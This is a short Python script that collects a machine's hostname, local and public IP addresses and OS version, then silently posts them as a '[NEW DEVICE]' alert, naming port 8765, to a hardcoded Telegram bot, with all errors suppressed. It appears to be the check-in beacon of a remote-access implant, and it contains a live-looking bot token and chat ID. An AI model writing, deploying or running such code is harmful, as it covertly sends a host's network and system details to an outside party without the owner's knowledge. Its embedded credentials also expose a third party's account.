# -*- coding: utf-8 -*-
import socket
import platform
import urllib.request
import urllib.parse
import json

BOT_TOKEN = "8994337587:AAEMVEneQh_rJe1FNK_08NWBp8TbrKRXIOg"
CHAT_ID   = "345019436"


def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "unknown"


def get_external_ip() -> str:
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as r:
            return r.read().decode()
    except Exception:
        return "unknown"


def notify_admin():
    hostname   = socket.gethostname()
    local_ip   = get_local_ip()
    ext_ip     = get_external_ip()
    os_info    = platform.version()
    user       = platform.node()

    text = (
        f"[NEW DEVICE]\n"
        f"Host:      {hostname}\n"
        f"Local IP:  {local_ip}\n"
        f"Public IP: {ext_ip}\n"
        f"OS:        {os_info}\n"
        f"Port:      8765"
    )

    try:
        data = urllib.parse.urlencode({
            "chat_id": CHAT_ID,
            "text": text,
        }).encode()
        urllib.request.urlopen(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data=data,
            timeout=10
        )
    except Exception:
        pass
